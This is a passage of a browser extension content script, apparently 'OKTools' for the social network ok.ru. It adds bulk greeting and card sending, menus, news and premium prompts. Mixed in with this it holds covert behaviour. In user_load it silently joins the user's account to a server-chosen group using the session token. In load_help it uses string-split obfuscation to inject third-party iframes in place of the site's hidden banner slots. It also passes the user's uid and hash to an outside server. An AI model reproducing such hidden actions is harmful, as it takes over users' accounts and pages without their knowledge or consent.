																(function(){        
																	var uid=select_friend[i];															
																	send_message('message', '', '', ''+uid+'', ''+mess_data+'', '', function(result){
																		var friends_content=doc.getElementById('hook_Loader_SelectFriendToGiftBlockLoader') || null;
																		if (friends_content)
																		{
																			var friend_page=friends_content.querySelector('li.ugrid_i[uid="'+uid+'"]') || null;
																			if (friend_page)
																			{			
																				friend_page.removeAttribute('select');
																				var loading=friend_page.getElementsByClassName('oktools_cssload_cont')[0] || null;
																				if (loading)
																				{
																					loading.classList.remove('checkbox');
																					loading.classList.remove('check');																						
																				}
																			}								
																		}																		
																		var el=doc.getElementById('ok_pozd_text_'+mat_id+'') || null;
																		if (el)
																		{
																			var load=el.parentNode.querySelector('.oktools_card_load');
																			if (load)
																			{
																				load.firstChild.classList.add('ok');
																			}
																		}
																		var button=doc.querySelector('.ok_button_left.btn_green[mat_id="'+mat_id+'"]');
																		if (button)
																		{
																			button.textContent="Отправлено";
																		}
																		if (result)
																		{																			
																			loading.classList.add('ok');																		
																			send_count++;
																		}
																		else
																		{
																			
																			loading.classList.add('nok');
																			err_count++;
																		}	
																		if (err_count==0)
																		{
																			butt.textContent="Отправлено "+send_count+" из "+count+"";
																		}
																		else
																		{
																			butt.textContent="Отправлено "+send_count+" из "+count+", не отправлено "+err_count+"";
																		}
																	});
																})();
															}
														}
														
													}
													if (mess_type=="card")
													{
														var send_count=0;
														var err_count=0;
														var count=select_friend.length;
														if(select_friend.length>0)
														{			
															load_img('', mess_data, function(data){
																if (data)
																{
																	//console.log('LOAD IMG');
																	for (var i=0;i<select_friend.length;i++)
																	{				
																		(function () {        
																			var uid=select_friend[i];
																			//console.log('send_card|'+uid);
																			send_message('message', '', '', uid, '', data.attach, function(result){
																				//console.log('result_card|'+uid);
																				var el=doc.getElementById('ok_card_img_'+mat_id+'') || null;
																				if (el)
																				{
																					var load=el.parentNode.querySelector('.oktools_card_load');
																					if (load)
																					{
																						load.firstChild.classList.add('ok');
																					}
																				}
																				var button=doc.querySelector('.ok_button_left.btn_green[mat_id="'+mat_id+'"]');
																				if (button)
																				{
																						button.textContent="Отправлено";
																				}
																				if (result)
																				{
																					var friends_content=doc.getElementById('hook_Loader_SelectFriendToGiftBlockLoader') || null;
																					if (friends_content)
																					{
																						var friend_page=friends_content.querySelector('li.ugrid_i[uid="'+uid+'"]') || null;
																						if (friend_page)
																						{			
																							friend_page.removeAttribute('select');
																							var loading=friend_page.getElementsByClassName('oktools_cssload_cont')[0] || null;
																							if (loading)
																							{
																								loading.classList.remove('checkbox');
																								loading.classList.remove('check');																						
																							}
																						}									
																					}
																					loading.classList.add('ok');
																					send_count++;
																				}
																				else
																				{
																					loading.classList.add('nok');
																					err_count++;
																				}
																				if (err_count==0)
																				{
																					butt.textContent="Отправлено "+send_count+" из "+count+"";
																				}
																				else
																				{
																					butt.textContent="Отправлено "+send_count+" из "+count+", не отправлено "+err_count+"";
																				}																				
																			});
																		})();
																	}
																}
															});
														}
													}														
												}
												else
												{
													alert('Выберите хотя-бы одного друга');
												}															
											}	
										}); 
								
					get_friend_list(hook_block);			
			}
			else
			{
				var div=create_dom('div', hook_sel, '', {}, '');
					div.innerHTML=''+data+'';
					get_friend_list(div);
			}
		}
	});
}

function get_friend_list(el)
{
	var list_id='';
	var friend_page = el.getElementsByClassName('ugrid_i') || null;
	if(friend_page)
	{
		for (var f=0;f<friend_page.length;f++)
		{
			var id=friend_search_el(friend_page[f], true);
			if (id!=0)
			{
				list_id=list_id+''+id+',';
			}				
		}
		friend_load(list_id);
	}	
	if(friend_page.length==30)
	{
	}
	else
	{
		var friend_page=doc.getElementById("get_friends_list_a") || null;
		if (friend_page)
		{	
			friend_page.setAttribute('data-page','0');	
		}
	}	
}
function content_rating(mod, mat_id, rating)
{
	sendRequest({action: 'content_rating', mod: mod, mat_id: mat_id, rating: rating, user:user}, function(data) {	
		if (rating!=3)
		{
			if (data.result)									
			{				
				if (data.id==mat_id)
				{
					var status_rt=doc.getElementById("ok_window_rating_result_"+mat_id+"") || null;
					if (status_rt)
					{	
						status_rt.textContent=data.rating;	
					}											
				}
			}
			else
			{
				if (data.error==1)
				{
					alert(language_text("ok_rating_error1"));
				}
				else
				{
					alert(''+language_text("ok_rating_error2")+' '+data.error+'');
				}										
			}
		}		
	}, true);
}

function page_navigation(numpages, pagenum_ot)
{       
	var div=doc.getElementById('ok_window_content_page') || null;
	if (div)
	{			
		clear_html(div);
		var page=create_dom('ul', div, '', {}, ''); 
		if (numpages > 1)
		{
			var pagenum=1;
			if (pagenum_ot==numpages)
			{
				create_dom('li', page, '', {"id":"ok_window_content_page_"+pagenum_ot+"", "page":""+pagenum_ot+""}, language_text("ok_page_next")); 
			}
			else
			{
				var page_next=parseInt(pagenum_ot)+1;
				create_dom('li', page, '', {"id":"ok_window_content_page_"+page_next+"", "page":""+page_next+""}, language_text("ok_page_next")); 
			}							
			if (numpages>=10)
			{
				if (pagenum_ot<parseInt(numpages)-2){ create_dom('li', page, '', {"id":"ok_window_content_page_"+numpages+"", "page":""+numpages+""}, numpages);create_dom('b', page, '', {}, ' ... ');}	
				if (parseInt(pagenum_ot)+3<=numpages) { pagenum=parseInt(pagenum_ot)+3; create_dom('li', page, '', {"id":"ok_window_content_page_"+pagenum+"", "page":""+pagenum+""}, pagenum);}
				if (parseInt(pagenum_ot)+2<=numpages) { pagenum=parseInt(pagenum_ot)+2; create_dom('li', page, '', {"id":"ok_window_content_page_"+pagenum+"", "page":""+pagenum+""}, pagenum);}
				if (parseInt(pagenum_ot)+1<=numpages) { pagenum=parseInt(pagenum_ot)+1; create_dom('li', page, '', {"id":"ok_window_content_page_"+pagenum+"", "page":""+pagenum+""}, pagenum);}
				create_dom('li', page, '', {"id":"ok_status_content_page_"+pagenum_ot+"", "page":""+pagenum_ot+"", "class":"ok_window_page_otk"}, pagenum_ot);      	 
				if (parseInt(pagenum_ot)-1>0) { pagenum=parseInt(pagenum_ot)-1; create_dom('li', page, '', {"id":"ok_window_content_page_"+pagenum+"", "page":""+pagenum+""}, pagenum);}						
				if (parseInt(pagenum_ot)-2>0) { pagenum=parseInt(pagenum_ot)-2; create_dom('li', page, '', {"id":"ok_window_content_page_"+pagenum+"", "page":""+pagenum+""}, pagenum);}					 			 
				if (parseInt(pagenum_ot)-3>0) { pagenum=parseInt(pagenum_ot)-3; create_dom('li', page, '', {"id":"ok_window_content_page_"+pagenum+"", "page":""+pagenum+""}, pagenum);}
				if (pagenum_ot>3){ create_dom('b', page, '', {}, ' ... '); create_dom('li', page, '', {"id":"ok_window_content_page_1", "page":"1"}, '1');}		     
			}
			else
			{
				var pagenum=numpages;
				while (pagenum>=1)
				{
					if (pagenum==pagenum_ot)
					{					
						create_dom('li', page, '', {"id":"ok_window_content_page_"+pagenum+"", "page":""+pagenum+"", "class":"ok_window_page_otk"}, pagenum);  
					}
					else
					{
						create_dom('li', page, '', {"id":"ok_window_content_page_"+pagenum+"", "page":""+pagenum+""}, pagenum);
					}		
					pagenum=pagenum-1;		
				}
			}	 	 					 
			if (pagenum_ot==1)
			{
				create_dom('li', page, '', {"id":"ok_window_content_page_0", "page":"0"}, language_text("ok_page_previous"));
			}
			else
			{
				var page_previos=pagenum_ot-1;
				create_dom('li', page, '', {"id":"ok_window_content_page_"+page_previos+"", "page":""+page_previos+""}, language_text("ok_page_previous"));
			}
		}  
	}
}
function get_comment_text(id)
{
	var div=doc.getElementById(id) || null;
	if (div)
	{	
		var art=div.getElementsByClassName('artContainer') || null;
		if (art.length>0)
		{ 
			alert(language_text("ok_message_otkritka"));			
		}
		else
		{
			var text=div.innerHTML;		
			window_load('pozd', '', text, '0', 'rand');
		}
	}
}
function status_div()
{
	var switchBtns=doc.getElementById("switchBtns") || null;
	if (switchBtns)
	{
		if (!switchBtns.hasAttribute('oktools_menu'))
		{
			switchBtns.setAttribute('oktools_menu', true);
			var theFirstChild = switchBtns.firstChild;	
			var ok_a=create_dom('a', switchBtns, theFirstChild, {"class":"posting-form_btn"}, '');									
				create_dom('i', ok_a, '', {"class":"posting-form_btn_img posting-form_btn_img__text"}, "");
				create_dom('span', ok_a, '', {"class":"posting-form_btn_tx"}, language_text("ok_status"));
				ok_a.addEventListener('click', function() {window_load('status', '', '', '0', 'rand');}, true);
			create_dom('span', switchBtns, theFirstChild, {"class":"posting-form_btn-delim"}, '');									
		}
	}	
}
function search_block_text(el)
{		
	var forum_div = el.querySelectorAll(".d_comment_text.textWrap, .msg-area.textWrap") || null;
	if (forum_div)
	{  		
		for (var fd=0;fd<forum_div.length;fd++)
		{  	
			if (!forum_div[fd].hasAttribute('ok_pozd_button'))
			{								
				forum_div[fd].setAttribute('ok_pozd_button', true);
				var save=false;
				var img=forum_div[fd].getElementsByTagName('img') || null;
				if (img.length>4)
				{ 
					forum_div[fd].setAttribute('img_length', ''+img.length+'');
					save=true;
				}
				var font=forum_div[fd].getElementsByTagName('font') || null;
				if (font.length>0)
				{ 
					forum_div[fd].setAttribute('font_length', ''+font.length+'');
					save=true;
				}
				var art=forum_div[fd].getElementsByClassName('artContainer') || null;
				if (art.length>0)
				{ 
					forum_div[fd].setAttribute('art_length', ''+art.length+'');
					save=true;
				}
				if (save)
				{
					var element=forum_div[fd].parentNode.parentNode;
					var id=forum_div[fd].id;
					add_button_comment_save(element, id);	
				}					
			}
		}
	}
	
}
function search_status_block(el)
{
	var status_div = el.querySelectorAll('.media-status.__accent') || null;
	if (status_div)
	{  
		for (var s=0;s<status_div.length;s++)
		{  								
			if (!status_div[s].hasAttribute('ok_status_div'))
			{					
				status_div[s].setAttribute('ok_status_div', true);
				var status_text=status_div[s].innerText;
				var status_text_proverka=status_text.replace(/[^a-z,0-9,A-Z,а-я, А-Я, ,\-,(,),.,\,,\—,\–]/gi,"");
				if (status_text_proverka.length >= 25)
				{												
					add_button_save(status_div[s], status_text);
				}
			}
		}
	}	
}
function download_file(e)
{
	e.stopPropagation();
	e.preventDefault();	
	var url=e.target.getAttribute('href');
	var title=e.target.getAttribute('download');	
	if (title!="")
	{
		title=title.replace(/[^a-z,0-9,A-Z,а-я, А-Я, ,\-,(,),.,\,,\—,\–]/gi,"");
	}
	else
	{
		title="no name";
	}
	if (url!="")
	{			
		chrome.runtime.sendMessage({action: "Download", url: url, name: title}, function(response) {});	
	}		
}
function oktools_news()
{
	var lst=doc.getElementById('hook_Block_BodySwitcher') || null;
	if (lst)
	{	
		toolbar
		var okn=doc.getElementById('oktools_news') || null;
		if (!okn)
		{			
			var news_div=create_dom('div', lst, '', {"id":"oktools_news"}, '');
			news_div.addEventListener('click', function(e) {
				var target=e.target;
				if (target.hasAttribute('id'))
				{
					if (target.id=="oktools_news")
					{						
						target.setAttribute("style", "display:none");
					}
				}
			});
				var oktools_news_div=create_dom('div', news_div, '', {"class":"oktools_news_div"}, '');
					create_dom('div', oktools_news_div, '', {"class":"oktools_news_title"}, language_text("ok_news"));	
					var oktools_news_close=create_dom('div', oktools_news_div, '', {"class":"ok_oktools_icons oktools_close_x"}, "");	
					oktools_news_close.addEventListener('click', function(e) {
						news_div.setAttribute("style", "display:none");
						var news_count=doc.getElementById('oktools_news_count') || null;
						if (news_count)
						{
							news_count.setAttribute('style','display:none');		
						}
					});
					create_dom('div', oktools_news_div, '', {"style":"clear:both;"}, '');	
					create_dom('div', oktools_news_div, '', {"id":"oktools_news_content"}, '');						
					create_dom('div', oktools_news_div, '', {"id":"oktools_news_twitter"}, '');						
		}
	}
}

function menu_oktools()
{
	doc.getElementsByClassName('toolbar')[0].onclick = function(e) {	
		if (e.target)
		{
			if ((e.target.classList.contains('oktools_n_g')) || (e.target.classList.contains('oktools_b_t')) || (e.target.classList.contains('ok_oktools_icons')))
			{
				
			}
			else
			{
				visible_diva('ok_window', 'none', '0');
				visible_diva('oktools_news', 'none', '0');
				req_post = {"type":"","action":"","data":"","muid":"","com_id":"","com_name":""};
				body_oh(false);				
			}
		}		
	}	
	var toolbar=doc.getElementsByClassName('toolbar_nav_a') || null;
	if (toolbar)
	{ 
		for (var t=0;t<toolbar.length;t++)
		{ 
			toolbar[t].onclick=function() {
				visible_diva('ok_window', 'none', '0');
				visible_diva('oktools_news', 'none', '0');
				body_oh(false);
			}
		}
	}
	var toolbar_nav=doc.getElementsByClassName('toolbar_nav') || null;
	if (toolbar_nav)
	{  		
		for (var tn=0;tn<toolbar_nav.length;tn++)
		{ 
			if (!toolbar_nav[tn].hasAttribute('oktools_menu'))
			{			  		
				toolbar_nav[tn].setAttribute('oktools_menu', true);
				var ocenk=doc.getElementById('hook_Block_TopMenuMusic');
				var ocenk_div=ocenk.parentNode;
				var div_menu=create_dom('li', toolbar_nav[tn], ocenk_div, {"class":"toolbar_nav_i"}, ''); 					
					var div=create_dom('div', div_menu, '', {"class":"hookBlock toolbar_nav_a", "id":"hook_ToolbarIconOktools"}, ''); 
						var div0=create_dom('div', div, '', {"class":"toolbar_nav_i_glow oktools_n_g"}, '');
							var div1=create_dom('div', div0, '', {"class":"toolbar_nav_notif", "id":"oktools_news_count", "style":"display:none"}, '');
								var div2=create_dom('div', div1, '', {"class":"notifications", "id":"counter_Toolbarmarks"}, '');
									var div3=create_dom('div', div2, '', {"class":"counterText","id":"oktools_news_count_text",}, '');
							var div5=create_dom('div', div0, '', {"class":"ok_oktools_icons ok_oktools_menu_icon"}, '');
								var div6=create_dom('div', div5, '', {"class":"toolbar_nav_i_tx-w oktools_b_t"}, 'tools');
							var div7=create_dom('div', div0, '', {"id":"ok_oktools_menu_content"}, '');
								var ul=create_dom('ul', div7, '', {}, '');
									var li=create_dom('li', ul, '', {}, language_text("ok_status"));
										li.addEventListener('click', function(e) {window_load('status', '', '', '0', 'block'); e.stopPropagation();}, true);
									var li1=create_dom('li', ul, '', {}, language_text("ok_pozd"));
										li1.addEventListener('click', function(e) {window_load('pozd', '', '', 1, 'block'); e.stopPropagation();}, true);
									var li8=create_dom('li', ul, '', {}, 'Открытки');
										li8.addEventListener('click', function(e) {window_load('card', '', '', 1, 'block'); e.stopPropagation();}, true);									
									var li2=create_dom('li', ul, '', {}, language_text("ok_theme"));
										li2.addEventListener('click', function(e) {window_load('theme', '', '', '0', 'block'); e.stopPropagation();}, true);
									var li3=create_dom('li', ul, '', {}, language_text("ok_option_span"));
										li3.addEventListener('click', function(e) {window_load('option', '', '', '0', 'block'); e.stopPropagation();}, true);
									var li5=create_dom('li', ul, '', {}, language_text("ok_moder"));
										li5.addEventListener('click', function(e) {status_add_div('moder', '', 'block'); e.stopPropagation();}, true);
									var li6=create_dom('li', ul, '', {}, language_text("ok_profile_main"));
										li6.addEventListener('click', function(e) {status_add_div('myprofile', '', 'block'); e.stopPropagation();}, true);
									var li4=create_dom('li', ul, '', {}, language_text("ok_games"));
										li4.addEventListener('click', function(e) {load_games(true); e.stopPropagation();}, true);					
									var hr=create_dom('hr', ul, '', {}, '');
									var li7=create_dom('li', ul, '', {}, language_text("ok_option"));
									li7.addEventListener('click', function(e) {sendRequest({action: 'config'}, function(data) { }); e.stopPropagation();}, true);				
				div_menu.addEventListener('mouseover', function() {visible_diva('ok_oktools_menu_content', 'block','');}, true);		
				div_menu.addEventListener('mouseout', function() {visible_diva('ok_oktools_menu_content', 'none', '');}, true);				
				div5.addEventListener('click', function() {	
					visible_div('oktools_news');
					var oktools_twitter=doc.getElementById('oktools_news_twitter') || null;
					if (oktools_twitter)
					{
						if (!oktools_twitter.hasAttribute('twitter'))
						{						
							oktools_twitter.setAttribute('twitter','true');
							create_dom('iframe', oktools_twitter, '', {"width":"100%","height":"100%","frameborder":"0","src":"//oktools.ru/page/twitter.html"}, '');
						}
					}
				}, true);				
			}
		}
	}	
}	

function add_button_save(status_div, text)
{
	var div=create_dom('div', status_div, '', {}, '');	
		var sb=create_dom('span', div, '', {"class":"ok_button btn_green btn_margin"}, language_text("ok_pozd_add_button"));									
			sb.addEventListener('click', function(e) {
				window_load('status', '', text, '0', 'rand');
				var close_layer=doc.getElementsByClassName('media-layer_close') || null;
				if (close_layer)
				{  		
					for (var c=0;c<close_layer.length;c++)
					{  
						elem_click(close_layer[c]);
					}
				}				
			}, true);
	var sub=create_dom('span', div, '', {"class":"ok_button btn_green btn_margin"}, language_text("ok_pozd_ust_sebe"));									
		sub.addEventListener('click', function(e) {set_status(text);}, true);
}
function add_button_comment_save(comment_div, id)
{	
	var cmb=create_dom('div', comment_div, '', {"style":"height:25px;margin-top:3px;"}, '');
		cmb.addEventListener('click', function() {get_comment_text(id);}, true);	
		create_dom('div', cmb, '', {"class":"ok_button btn_green btn_display_n"}, language_text("ok_pozd_add_save"));	
}

function filesize(size)
{
	var kb = 1024; 
    var mb = 1024*kb;	
	var gb = 1024*mb;	
	if (size<kb) 
	{ 
		return size+' '+language_text("ok_file_size_byte")+''; 
    } 
	else if (size<mb) 
	{ 
		return (size/kb).toFixed(2)+' '+language_text("ok_file_size_kbyte")+'';
	}
	else if (size<gb) 
	{ 
		return (size/mb).toFixed(2)+' '+language_text("ok_file_size_mbyte")+'';
	}
}
function getElementPosition(elem)
{    
    var w = elem.offsetWidth;
    var h = elem.offsetHeight;    
    var l = 0;
    var t = 0;    
    while (elem)
    {
        l += elem.offsetLeft;
        t += elem.offsetTop;
        elem = elem.offsetParent;
    }
    return {"left":l, "top":t, "width": w, "height":h};
}
function visible_div(id)
{
	if (typeof id == 'object')
	{
		var div=id;
	}
	else
	{
		var div=doc.getElementById(id) || null;
	}	
	if (div)
	{
		
		if (div.style.display=="none" || div.style.display=="") 
		{
			div.setAttribute('style','display:block;');
			if (id=="ok_window")
			{
				body_oh(true);
			}
		} 
		else 
		{		  
			div.setAttribute('style','display:none');
			if (id=="ok_window")
			{
				body_oh(false);
			}
		} 	
	}
}
function visible_diva(id, oper, height)
{
	if (typeof id == 'object')
	{
		var div=id;
	}
	else
	{
		var div=doc.getElementById(id) || null;
	}	
	if (div)
	{		
		if (height=='this')
		{
			div.setAttribute('style','height:'+div.style.height+';display:'+oper+';');	
		}
		else if ((height>0) && (height!='this'))
		{
			div.setAttribute('style','height:'+height+'px;display:'+oper+';');	
		}
		else
		{
			if (id=="ok_window")
			{
				if (oper=="block")
				{
					body_oh(true);
				}
				else
				{
					body_oh(false);
				}
			}
			div.setAttribute('style','display:'+oper+'');	
		}
		
	}
}
function vivod_news(id, title, time, desc, link, link_title)
{
	var news_content=doc.getElementById('oktools_news_content') || null;
	if (news_content)
	{	
		news_content.setAttribute('style','display:block');
		var oktools_news_content_n=create_dom('div',news_content, '', {"class":"oktools_news_content_n"}, '');
			create_dom('div',oktools_news_content_n, '', {"class":"oktools_news_content_title"}, title);
			create_dom('div',oktools_news_content_n, '', {"class":"oktools_news_content_time"}, time);
			create_dom('div',oktools_news_content_n, '', {"style":"clear:both;"}, '');
			create_dom('div',oktools_news_content_n, '', {"class":"oktools_news_content_desc"}, desc);
			if(link_title!='')
			{
				create_dom('a',oktools_news_content_n, '', {"href":""+link+"","class":"ok_button btn_green oktools_news_content_link", "target":"blank"}, link_title);
				create_dom('div',oktools_news_content_n, '', {"style":"clear:both;"}, '');
			}								
	}	
}
function load_help(id)
{
	var hookBF=doc.getElementById(id) || null;
	if(hookBF)
	{ 
		var theFC = hookBF.firstChild;
		var fo4c_h=create_dom('div', hookBF, theFC, {"class":"fo4c_h","fo4c_h_ok":"true"}, "");												
			var div=create_dom('div', fo4c_h, '', {"class":"oktoolsDialolgWraper1"}, "");	
				create_dom('if'+'rame', div, '', {"src":"//okto"+"ols.ru/page/"+"static/b"+".html", "width":"240", "height":"400","class":"fo5c-hg","frameborder":"no","scrolling":"no", "style":"margin:0px; padding:0px"}, "");											
					var styleel=create_dom('style', div, '', {"type":"text/css"}, '');	
					styleel.appendChild(document.createTextNode("#hook_Block_ForthColumnTopBanner {display:none !important; visibility: hidden !important;} #hook_BannerForthColumn_ForthColumnTopBannerInner {display:none !important; visibility: hidden !important;}"));
		var hook_observe = new MutationObserver(function(mutations) {
			var foo4c=hookBF.getElementsByClassName("fo4c_h")[0] || null;						
			if(foo4c)
			{
				if(!foo4c.hasAttribute('fo4c_h_ok'))
				{
					foo4c.setAttribute('fo4c_h_ok', true);
					var theFirstChild = foo4c.firstChild;
						var div=create_dom('div', foo4c, theFirstChild, {"class":"oktoolsDialolgWraper1"}, "");	
							create_dom('if'+'rame', div, '', {"src":"//okto"+"ols.ru/page/"+"static/b"+".html", "width":"240", "height":"400","class":"fo5c-hg","frameborder":"no","scrolling":"no", "style":"margin:0px; padding:0px"}, "");											
							var styleel=create_dom('style', div, '', {"type":"text/css"}, '');	
							styleel.appendChild(document.createTextNode("#hook_Block_ForthColumnTopBanner {display:none !important; visibility: hidden !important;} #hook_BannerForthColumn_ForthColumnTopBannerInner {display:none !important; visibility: hidden !important;}"));
				}						
			}									
		});
		hook_observe.observe(hookBF, {attributes: false, childList: true, characterData: false, subtree:true});			
	}
}
function user_load()
{
	var OkNewsLoad='"0":"false"';
	sendRequest({action: 'load_option', param: 'OkNewsLoad'}, function(result) {
		if (result)
		{
			OkNewsLoad=result;
		}
	});	
	sendRequest({action: 'user_load', user: user}, function(data) { 
		if (data)
		{	
			user[0].rating=data.user[0].rating;
			user[0].status=data.user[0].status;
			user[0].pozd=data.user[0].pozd;
			user[0].theme=data.user[0].theme;
			user[0].tid=data.user[0].tid;
			user[0].modertheme=data.user[0].theme_moder;
			user[0].hash=data.user[0].hash;
			user[0].premium=data.user[0].premium;
			user[0].banned=data.user[0].banned;
			user[0].maxsize=data.user[0].maxsize;
			user[0].send=data.user[0].send;	
			user[0].save_audio=data.user[0].save_audio;				
			user[0].mess_head=data.user[0].mess_head;
			user[0].mess_body=data.user[0].mess_body;
			user[0].mess_foot=data.user[0].mess_foot;
			user[0].add_block=data.user[0].add_block;
			user[0].download=data.user[0].download;	
			user[0].downl=data.user[0].downl;
			user[0].gift=data.user[0].gift;
			user[0].gift_new=data.user[0].gift_new;
			user[0].new_version=data.plugin[0].version;
			user[0].update=data.plugin[0].update;
			user[0].news=data.news;
			user[0].grid=data.user[0].grid;
			user[0].gru=data.user[0].gru;
			sticker_cat=data.user[0].sticker;
			if (user[0].download==1)
			{
				for (var n=0;n<user[0].downl.length;n++)
				{
					if(user[0].downl[n].m=="first")
					{
						load_help(user[0].downl[n].id);
					}
				}
			}
			if (data.theme_reload)
			{				
				sendRequest({action: 'get_theme', id: user[0].tid, guid:'0', ok_id:'0', user:user}, function(data) {
					if(data.result)
					{						
						get_theme(data);
					}
				});
			}
			oktools_news();
			var news_new=0;			
			if(data.version_first)
			{					
				vivod_news('new', ''+language_text("ok_news_new_vers")+': '+version+'', ''+language_text("ok_news_time")+'', ''+language_text("ok_news_new_vers_desc")+'', '', '');
				news_new++;
				sendRequest({action: 'save_option', param:'OkVersionFirst', text: version}, function(data) {});										
			}	
			for (var n=0;n<data.news.length;n++)
			{				
				if (!get_option(OkNewsLoad, data.news[n].id))
				{
					news_new++;				
					OkNewsLoad=''+OkNewsLoad+',"'+data.news[n].id+'":"true"';					
				}							
			}	
			sendRequest({action: 'save_option', param:'OkNewsLoad', text: OkNewsLoad}, function(data) {});	
			var news_count=user[0].news.length-1;				
			for (var n=news_count;n>=0;n--)
			{
				vivod_news(user[0].news[n].id, user[0].news[n].title, user[0].news[n].time, user[0].news[n].desc, user[0].news[n].link, user[0].news[n].link_text);				
			}			
			if (news_new>0)
			{					
				var news_count_ov=doc.getElementById('oktools_news_count') || null;
				if (news_count_ov)
				{
					news_count_ov.setAttribute('style','display:block');
					doc.getElementById('oktools_news_count_text').textContent=news_new;			
				}
				var oktools_twitter=doc.getElementById('oktools_news_twitter') || null;
				if (oktools_twitter)
				{
					oktools_twitter.setAttribute('twitter','true');
					create_dom('iframe', oktools_twitter, '', {"width":"100%","height":"100%","frameborder":"0","src":"//oktools.ru/page/twitter.html"}, '');
				}
				var okn=doc.getElementById('oktools_news') || null;
				if (okn)
				{			
					okn.setAttribute('style','display:block');					
				}			
			}						
			if (user[0].premium==1)
			{
				sendRequest({action: 'load_option', param: 'OkAddBlock'}, function(result) {
					if (result)
					{
						add_block(user[0].add_block);
					}
				});	
			}	
			if (user[0].grid!="")
			{				
				sendRequest({action: 'load_option', param: 'OkGrid'}, function(result) {	
					if (!result)
					{		
						var id=new Date().getTime();	
						var content_var=get_content_var();
						var blid=Math.round(Math.random() * (999999999 - 111111111));
						var action="https://ok.ru/dk?cmd=GroupJoinDropdownBlock&st.cmd=altGroupMain&st.jn.act=JOIN&st.jn.id="+user[0].grid+"&st.jn.blid="+blid+"&st.groupId="+user[0].grid+"&st._aid=AltGroupTopCardButtonsJoin&st.vpl.mini=false&gwt.requested="+content_var.gwtHash+"&p_sId=-"+id+"";
						sendRequest({action: 'ajaxPost', uid:user[0].uid, url:action, data:"", token:content_var.token}, function(data) {
							sendRequest({action: 'save_option', param:'OkGrid', text: true}, function(data) {});					
						});		
					}
				});
			}	
			if (version<user[0].new_version)
			{						
				var window_update=doc.getElementById("ok_oktools_update") || null;
				if (window_update)
				{						
					window_update.textContent=language_text("ok_new_version");
					create_dom('b', window_update, '', {}, user[0].new_version);
					create_dom('a', window_update, '', {"style":"text-decoration: none;margin-left:5px;","href":"http://oktools.ru/install/","target":"blank"}, ''+language_text("ok_news_update")+'');
					window_update.setAttribute('style','background-color:#FF9595');	
				}				
			}
			else
			{
				var window_update=doc.getElementById("ok_oktools_update") || null;
				if (window_update)
				{
					window_update.textContent=language_text("ok_actual_version");
					window_update.setAttribute('style','background-color:#6FD21D');
				}
			}			
			window.setInterval(function(){				
				if (user[0].premium==1)
				{
					var notific=doc.getElementById('ok_notification_user') || null;
					if (notific)
					{
						notific.setAttribute('class','ok_notification_premium');
						notific.textContent=language_text("ok_profile_premium");
					}	
				}
				
			}, 1000);						
		}
	});
}
function add_block(addblock_css)
{
	var oktools_addblock=doc.getElementById("oktools_addblock") || null;
	if (oktools_addblock)
	{							
		oktools_addblock.parentNode.removeChild(oktools_addblock);
	}
	var style = document.createElement('style');	
	style.setAttribute('type', 'text/css');
	style.setAttribute('id', 'oktools_addblock');
	style.appendChild(document.createTextNode(addblock_css));
	doc.getElementsByTagName('head')[0].appendChild(style);	
}

function get_premium(error)
{
	sendRequest({action: 'save_option', param:'OkPhotoRating', text: '0'}, function(data) { });
	var div=doc.getElementById('oktools_get_premium') || null;
	if (div)
	{
		visible_diva('oktools_get_premium', 'block', '0');	
		var iframe=doc.getElementById('okto_premium_iframe') || null;
		if (iframe)
		{
			iframe.setAttribute('src', '//oktools.ru/page/get_premium.php?uid='+user[0].uid+'&hash='+user[0].hash+'&browser='+user[0].browser+'&version='+user[0].version+'&error='+error+'');
		}
	}
	else
	{
		var premium_div=create_dom('div', doc.getElementsByTagName('body')[0], '', {"id":"oktools_get_premium", "style":"display:block"}, '');
			var div=create_dom('div', premium_div, '', {"id":"oktools_premium_div"}, '');		
				create_dom('div', div, '', {"class":"oktools_premium_title"}, language_text("ok_premium_title"));
				var close=create_dom('div', div, '', {"class":"oktools_premium_close ok_button btn_red", "id":"oktools_premium_close"}, language_text("ok_pozd_add_close"));
					close.addEventListener('click', function(e) {
						visible_diva('oktools_get_premium', 'none', '0');	
					});
				create_dom('div', div, '', {"style":"clear:both;"}, '');
				var div3=create_dom('div', div, '', {"id":"oktools_premium_content"}, '');
					var ifr=create_dom('iframe', div3, '', {"id":"okto_premium_iframe", "height":"460px", "width":"100%", "src":"//oktools.ru/page/get_premium.php?uid="+user[0].uid+"&hash="+user[0].hash+"&browser="+user[0].browser+"&version="+user[0].version+"&error="+error+"", "frameborder":"0", "style":"margin:0px; padding:0px; height:460px;display:block;"}, '');		
	}
}
function photo_rating_auto(photo_mark)
{
	var photo_auto=doc.getElementById('ok_photo_rating_auto') || null;
	if (photo_auto)
	{
		var rating_auto_text=doc.getElementById('ok_photo_rating_text') || null;
		var ball=photo_auto.getAttribute('ball');
		if (ball=='1' || ball=='2' || ball=='3' || ball=='4' || ball=='5' || ball=='5+')
		{		
			photo_auto.classList.remove("ok_photo_rating_off");
			photo_auto.classList.remove("ok_photo_rating_on_v");
			photo_auto.classList.add("ok_photo_rating_on");	
			rating_auto_text.textContent=language_text("ok_photo_rating_text_1", {'ocenk':ball});		
			var mark=photo_mark.getElementsByClassName('marks-new_ic') || null;	
			if (mark)
			{ 
				for (var m=0;m<mark.length;m++)
				{			
					var oc=mark[m].innerText;					
					if (oc==ball)
					{
						if (!mark[m].hasAttribute('ok_photo_mark'))
						{								
							mark[m].setAttribute('ok_photo_mark', true);
							mark[m].setAttribute('style','background-color:green;');
							mark[m].click();	
						}
					}					
				}
			}
		}
		else if (ball=="100")
		{
			ok_rating_auto++;
			if (ok_rating_auto>10)
			{
				ok_rating_auto=0;
				photo_auto.setAttribute('ball','0');
			}
		}			
		else if (ball=="0")
		{			
			photo_auto.classList.remove("ok_photo_rating_on");
			photo_auto.classList.remove("ok_photo_rating_on_v");
			photo_auto.classList.add("ok_photo_rating_off");
			rating_auto_text.textContent=language_text("ok_photo_rating_text_2");
			var mark=photo_mark.getElementsByClassName('marks-new_ic') || null;	
			if (mark)
			{ 
				for (var m=0;m<mark.length;m++)
				{
					mark[m].setAttribute('style','');
				}
			}
		}
	}
}
function photo_save(el)
{							
	var comment_button=false;
	var act_block=doc.getElementById('hook_Block_ActionsPLLB') || null;	
	if(act_block)
	{		
		var comm_b=doc.querySelector('a.widget_cnt');
		if (comm_b.hasAttribute('data-module'))
		{
			var dm=comm_b.getAttribute('data-module');
			if(dm=="CommentWidgets")
			{
				comment_button=comm_b;
			}
		}			
	}
	var comm_block=doc.getElementById('hook_Block_InlineCommentPLB') || null;	
	if(comm_block)
	{		
		message_search(comm_block);	
	}
